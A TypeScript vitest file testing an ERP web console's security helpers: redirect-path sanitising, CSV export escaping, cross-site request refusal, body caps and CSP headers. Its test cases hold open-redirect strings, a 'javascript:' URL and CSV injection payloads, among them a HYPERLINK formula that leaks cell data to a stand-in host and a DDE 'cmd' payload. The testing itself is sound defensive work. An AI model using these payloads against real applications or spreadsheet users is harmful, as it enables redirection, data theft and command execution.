import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { describe, expect, it } from "vitest";

/**
 * Fences over `apps/operate-web`'s pure helpers, run from here because that member has no test
 * runner (`test-runner-config.ts` declares the exemption and what it costs). Each module under test
 * imports nothing, so vitest loads the exact file the app ships — no copy, no build, no dependency
 * edge from this package to the app. The specifier is computed rather than literal so this
 * package's typecheck does not pull a file outside its `rootDir` into the program; the shape of each
 * export is checked at runtime instead, by `fn`.
 */
const WEB_ROOT = fileURLToPath(new URL("../../../apps/operate-web/", import.meta.url));

async function webModule(relative: string): Promise<Record<string, unknown>> {
  const loaded: unknown = await import(`${WEB_ROOT}${relative}`);
  if (typeof loaded !== "object" || loaded === null) throw new Error(`${relative} did not load as a module`);
  return loaded as Record<string, unknown>;
}

function fn<T>(mod: Record<string, unknown>, name: string): T {
  const value = mod[name];
  if (typeof value !== "function") throw new Error(`expected an exported function named ${name}`);
  return value as T;
}

const session = await webModule("lib/session.ts");
const safeNextPath = fn<(raw: string | null | undefined) => string>(session, "safeNextPath");

const ORIGIN = "https://erp.example.test";

/** Where a browser on the console's origin actually goes when handed `path`. */
function destination(path: string): string {
  return new URL(path, `${ORIGIN}/login`).origin;
}

describe("operate-web safeNextPath (M-06)", () => {
  it.each([
    ["/e/invoices", "/e/invoices"],
    ["/e/invoices?status=open&limit=50", "/e/invoices?status=open&limit=50"],
    ["/platform/users/abc#members", "/platform/users/abc#members"],
    ["/reports/aging?asOf=2026-11-01", "/reports/aging?asOf=2026-11-01"],
    ["/e/caf%C3%A9", "/e/caf%C3%A9"],
  ])("keeps the same-origin path %j", (raw, expected) => {
    expect(safeNextPath(raw)).toBe(expected);
  });

  it.each([
    ["absent", null],
    ["undefined", undefined],
    ["empty", ""],
    ["an absolute URL", "https://evil.test/"],
    ["a scheme", "javascript:alert(1)"],
    ["protocol-relative", "//evil.test"],
    ["backslash", "/\\evil.test"],
    ["tab (the audit's `/%09/evil.com`)", "/\t/evil.test"],
    ["CR", "/\r/evil.test"],
    ["LF", "/\n/evil.test"],
    ["a tab between the slashes and the host", "/\t\t/evil.test"],
    ["a dot segment the parser removes", "/.//evil.test"],
    ["a parent segment the parser removes", "/x/..//evil.test"],
    ["a space", "/ /evil.test"],
    ["a NUL", "/\u0000/evil.test"],
    ["DEL", "/\u007f/evil.test"],
    ["the login page itself", "/login"],
    ["the login page with its own next", "/login?next=//evil.test"],
  ])("refuses %s", (_name, raw) => {
    expect(safeNextPath(raw)).toBe("/");
  });

  // The property the function exists for, over every input above and some adversarial extras: what
  // it returns, handed to a browser on the console's origin, stays on that origin.
  it.each([
    "/\t/evil.test",
    "/\n\r//evil.test",
    "/.//evil.test",
    "/./\\evil.test",
    "/%2F/evil.test",
    "/%09/evil.test",
    "/%5C%5Cevil.test",
    "/x/../..//evil.test",
    "/@evil.test",
    "/e/x?next=//evil.test",
  ])("never yields an off-origin navigation for %j", (raw) => {
    const out = safeNextPath(raw);
    expect(out.startsWith("/")).toBe(true);
    expect(out.startsWith("//")).toBe(false);
    expect(destination(out)).toBe(ORIGIN);
  });
});

const csv = await webModule("lib/csv.ts");
const csvCell = fn<(value: unknown) => string>(csv, "csvCell");
const toCsv = fn<
  (rows: ReadonlyArray<Record<string, unknown>>, columns: ReadonlyArray<{ key: string; label: string }>) => string
>(csv, "toCsv");

describe("operate-web CSV export (M-07)", () => {
  it.each([
    ["=HYPERLINK(\"https://evil.test?\"&A1,\"x\")", "\"'=HYPERLINK(\"\"https://evil.test?\"\"&A1,\"\"x\"\")\""],
    ["=1+1", "'=1+1"],
    ["+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1:A2)", "'@SUM(A1:A2)"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", "\"'\r=1+1\""],
    ["-", "'-"],
  ])("neutralises a formula-leading cell %j", (raw, expected) => {
    expect(csvCell(raw)).toBe(expected);
  });

  it.each([
    ["-10.25", "-10.25"],
    ["+3", "+3"],
    ["-0.5", "-0.5"],
    ["-.5", "-.5"],
    ["-1e3", "-1e3"],
    [-42, "-42"],
    [3.5, "3.5"],
    ["plain text", "plain text"],
    ["a, b", "\"a, b\""],
    ["say \"hi\"", "\"say \"\"hi\"\"\""],
    [true, "true"],
    [null, ""],
    [undefined, ""],
    ["a=b", "a=b"],
  ])("keeps %j as data", (raw, expected) => {
    expect(csvCell(raw)).toBe(expected);
  });

  it("neutralises the header row too, since a label is manifest-authored", () => {
    const text = toCsv([{ a: "=1+1", b: "-10.25" }], [
      { key: "a", label: "=evil" },
      { key: "b", label: "Amount" },
    ]);
    expect(text).toBe("'=evil,Amount\r\n'=1+1,-10.25");
  });
});

const guard = await webModule("lib/proxy-guard.ts");
const crossSiteRefusal = fn<
  (req: { method: string; secFetchSite: string | null; origin: string | null; host: string | null }) => string | null
>(guard, "crossSiteRefusal");
const proxyLimitsFromEnv = fn<
  (env: Record<string, string | undefined>) => { maxRequestBodyBytes: number; upstreamTimeoutMs: number }
>(guard, "proxyLimitsFromEnv");
const readCappedBody = fn<(req: Request, cap: number) => Promise<{ ok: boolean; bytes?: Uint8Array }>>(
  guard,
  "readCappedBody",
);
const isUpstreamTimeout = fn<(err: unknown) => boolean>(guard, "isUpstreamTimeout");

describe("operate-web proxy: cross-site refusal (M-07)", () => {
  const base = { method: "POST", secFetchSite: null, origin: null, host: "erp.example.test" };

  it.each(["GET", "HEAD", "OPTIONS", "get"])("admits a %s whatever its provenance", (method) => {
    expect(crossSiteRefusal({ ...base, method, secFetchSite: "cross-site", origin: "https://evil.test" })).toBeNull();
  });

  it.each(["POST", "PATCH", "PUT", "DELETE"])("admits a same-origin %s", (method) => {
    expect(crossSiteRefusal({ ...base, method, secFetchSite: "same-origin" })).toBeNull();
  });

  it.each([
    ["same-site", "a sibling subdomain, which SameSite=Strict lets through"],
    ["cross-site", "another site"],
    ["none", "a user navigation, which no page here produces for a write"],
  ])("refuses Sec-Fetch-Site %s (%s)", (site) => {
    expect(crossSiteRefusal({ ...base, secFetchSite: site, origin: `https://${base.host}` })).toBe(
      "cross_site_request",
    );
  });

  it("falls back to Origin against Host, ignoring the scheme TLS termination changes", () => {
    expect(crossSiteRefusal({ ...base, origin: "https://erp.example.test" })).toBeNull();
    expect(crossSiteRefusal({ ...base, origin: "http://ERP.example.test" })).toBeNull();
  });

  it.each([
    ["a foreign origin", "https://evil.test"],
    ["a sibling subdomain", "https://api.erp.example.test"],
    ["another port", "https://erp.example.test:8443"],
    ["the opaque null origin", "null"],
  ])("refuses %s", (_name, origin) => {
    expect(crossSiteRefusal({ ...base, origin })).toBe("origin_mismatch");
  });

  it("refuses a write that states neither header", () => {
    expect(crossSiteRefusal(base)).toBe("origin_absent");
  });

  it("refuses when there is no Host to compare against", () => {
    expect(crossSiteRefusal({ ...base, origin: "https://erp.example.test", host: null })).toBe("origin_mismatch");
  });

  it("trusts Sec-Fetch-Site over a matching Origin, since the header a page cannot forge decides", () => {
    expect(
      crossSiteRefusal({ ...base, secFetchSite: "same-site", origin: "https://erp.example.test" }),
    ).toBe("cross_site_request");
  });
});

describe("operate-web proxy: declared limits (M-07)", () => {
  it("defaults to the API's own body cap and a 60 s timeout", () => {
    expect(proxyLimitsFromEnv({})).toEqual({ maxRequestBodyBytes: 10 * 1024 * 1024, upstreamTimeoutMs: 60_000 });
    expect(proxyLimitsFromEnv({ OPERATE_WEB_UPSTREAM_TIMEOUT_MS: "  " }).upstreamTimeoutMs).toBe(60_000);
  });

  it("reads a declared value", () => {
    expect(
      proxyLimitsFromEnv({ OPERATE_WEB_MAX_REQUEST_BODY_BYTES: "2048", OPERATE_WEB_UPSTREAM_TIMEOUT_MS: "5000" }),
    ).toEqual({ maxRequestBodyBytes: 2048, upstreamTimeoutMs: 5000 });
  });

  it.each([
    ["OPERATE_WEB_UPSTREAM_TIMEOUT_MS", "5m"],
    ["OPERATE_WEB_UPSTREAM_TIMEOUT_MS", "500"],
    ["OPERATE_WEB_UPSTREAM_TIMEOUT_MS", "600001"],
    ["OPERATE_WEB_MAX_REQUEST_BODY_BYTES", "-1"],
    ["OPERATE_WEB_MAX_REQUEST_BODY_BYTES", "1e9"],
    ["OPERATE_WEB_MAX_REQUEST_BODY_BYTES", "1023"],
  ])("refuses %s=%s by name rather than serving the default", (name, value) => {
    expect(() => proxyLimitsFromEnv({ [name]: value })).toThrow(name);
  });
});

describe("operate-web proxy: capped body (M-07)", () => {
  type Body = NonNullable<ConstructorParameters<typeof Request>[1]>["body"];
  const post = (body: Body, headers: Record<string, string> = {}): Request =>
    new Request("http://web.test/api/x", { method: "POST", body, headers, duplex: "half" } as RequestInit);

  it("returns the body's exact bytes under the cap", async () => {
    const out = await readCappedBody(post(new Uint8Array([0xff, 0x00, 0x7b])), 16);
    expect(out.ok).toBe(true);
    expect(Array.from(out.bytes ?? [])).toEqual([0xff, 0x00, 0x7b]);
  });

  it("admits a body exactly at the cap", async () => {
    expect((await readCappedBody(post("x".repeat(16)), 16)).ok).toBe(true);
  });

  it("refuses a body one byte over the cap", async () => {
    expect((await readCappedBody(post("x".repeat(17)), 16)).ok).toBe(false);
  });

  it("refuses on a declared Content-Length before reading", async () => {
    expect((await readCappedBody(post("x", { "content-length": "999999" }), 16)).ok).toBe(false);
  });

  it("counts a streamed body with no Content-Length as it arrives", async () => {
    let pulls = 0;
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        pulls += 1;
        controller.enqueue(new Uint8Array(10));
        if (pulls > 1000) controller.close();
      },
    });
    expect((await readCappedBody(post(stream), 25)).ok).toBe(false);
    expect(pulls).toBeLessThan(10);
  });

  it("answers an empty body as zero bytes", async () => {
    const out = await readCappedBody(post(null), 16);
    expect(out.ok).toBe(true);
    expect(out.bytes?.byteLength).toBe(0);
  });
});

describe("operate-web proxy: timeout classification (M-07)", () => {
  it("reads AbortSignal.timeout's reason as a timeout and nothing else", async () => {
    const signal = AbortSignal.timeout(1);
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(isUpstreamTimeout(signal.reason)).toBe(true);
    expect(isUpstreamTimeout(new TypeError("fetch failed"))).toBe(false);
    expect(isUpstreamTimeout(new DOMException("aborted", "AbortError"))).toBe(false);
  });
});

const headersModule = await webModule("security-headers.mjs");
const contentSecurityPolicy = fn<(opts: { development: boolean }) => string>(headersModule, "contentSecurityPolicy");
const securityHeaders = fn<(opts: { development: boolean }) => Array<{ key: string; value: string }>>(
  headersModule,
  "securityHeaders",
);

describe("operate-web page security headers (M-07)", () => {
  const directives = (policy: string): Map<string, string[]> =>
    new Map(
      policy.split(";").map((d) => {
        const [name = "", ...values] = d.trim().split(/\s+/);
        return [name, values];
      }),
    );

  it("denies framing, plugins, foreign bases and foreign form targets in production", () => {
    const csp = directives(contentSecurityPolicy({ development: false }));
    expect(csp.get("frame-ancestors")).toEqual(["'none'"]);
    expect(csp.get("object-src")).toEqual(["'none'"]);
    expect(csp.get("base-uri")).toEqual(["'self'"]);
    expect(csp.get("form-action")).toEqual(["'self'"]);
    expect(csp.get("default-src")).toEqual(["'self'"]);
  });

  it("names no foreign origin anywhere, so script, fetch and image exfiltration stay on this origin", () => {
    const csp = contentSecurityPolicy({ development: false });
    expect(csp).not.toMatch(/https?:|\*|data:|blob:|ws:/);
    expect(csp).not.toContain("unsafe-eval");
    expect(directives(csp).get("connect-src")).toEqual(["'self'"]);
    expect(directives(csp).get("img-src")).toEqual(["'self'"]);
  });

  it("adds only eval and the HMR socket in development", () => {
    const dev = directives(contentSecurityPolicy({ development: true }));
    expect(dev.get("script-src")).toContain("'unsafe-eval'");
    expect(dev.get("connect-src")).toEqual(["'self'", "ws:"]);
  });

  it("sends HSTS in production only, and never for sibling hosts", () => {
    const prod = securityHeaders({ development: false });
    const hsts = prod.find((h) => h.key === "Strict-Transport-Security");
    expect(hsts?.value).toBe("max-age=31536000");
    expect(securityHeaders({ development: true }).some((h) => h.key === "Strict-Transport-Security")).toBe(false);
    for (const key of ["Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy"]) {
      expect(prod.some((h) => h.key === key)).toBe(true);
    }
  });

  it("is what next.config.mjs serves, on every path", async () => {
    const config = await webModule("next.config.mjs");
    const nextConfig = config["default"] as { headers?: () => Promise<Array<{ source: string; headers: unknown }>> };
    expect(typeof nextConfig.headers).toBe("function");
    const rules = await nextConfig.headers!();
    expect(rules).toHaveLength(1);
    expect(rules[0]?.source).toBe("/:path*");
    const served = rules[0]?.headers as Array<{ key: string; value: string }>;
    expect(served.find((h) => h.key === "Content-Security-Policy")?.value).toContain("frame-ancestors 'none'");
  });
});

/**
 * The route handlers that call the helpers above cannot be run from here (they import `next`), so
 * what is fenced is that they *call* them, read as text with comments stripped — a comment naming a
 * helper must not satisfy the fence that the helper is called.
 */
describe("operate-web route handlers call the guards (M-07)", () => {
  const source = (relative: string): string =>
    readFileSync(`${WEB_ROOT}${relative}`, "utf8")
      .replace(/\/\*[\s\S]*?\*\//g, "")
      .split("\n")
      .filter((line) => !line.trim().startsWith("//"))
      .join("\n");

  /** Every `.json(` call's argument text, brace-matched to its closing paren. */
  const jsonBodies = (text: string): string[] => {
    const out: string[] = [];
    for (let at = text.indexOf(".json("); at >= 0; at = text.indexOf(".json(", at + 1)) {
      let depth = 0;
      let end = at + ".json".length;
      for (; end < text.length; end += 1) {
        const ch = text[end];
        if (ch === "(") depth += 1;
        if (ch === ")") {
          depth -= 1;
          if (depth === 0) break;
        }
      }
      out.push(text.slice(at, end + 1));
    }
    return out;
  };

  const PROXY = "app/api/[...path]/route.ts";
  const LOGIN = "app/api/auth/login/route.ts";
  const LOGOUT = "app/api/auth/logout/route.ts";

  it.each([PROXY, LOGIN, LOGOUT])("%s refuses a cross-site write before it does anything else", (file) => {
    const text = source(file);
    const guard = text.indexOf("crossSiteRefusal(provenanceOf(req))");
    expect(guard).toBeGreaterThan(0);
    const firstFetch = text.indexOf("fetch(");
    if (firstFetch >= 0) expect(guard).toBeLessThan(firstFetch);
  });

  it.each([PROXY, LOGIN])("%s caps the body it reads and bounds the upstream wait", (file) => {
    const text = source(file);
    expect(text).toContain("readCappedBody(req, ");
    expect(text).not.toMatch(/req\.(?:text|json|arrayBuffer)\(\)/);
    expect(text).toContain("AbortSignal.timeout(");
  });

  it("names neither the upstream address nor the caught error in any body the proxy returns", () => {
    const bodies = jsonBodies(source(PROXY));
    expect(bodies.length).toBeGreaterThanOrEqual(4);
    for (const body of bodies) {
      expect(body).not.toContain("UPSTREAM_BASE_URL");
      expect(body).not.toMatch(/\berr\b/);
    }
  });
});
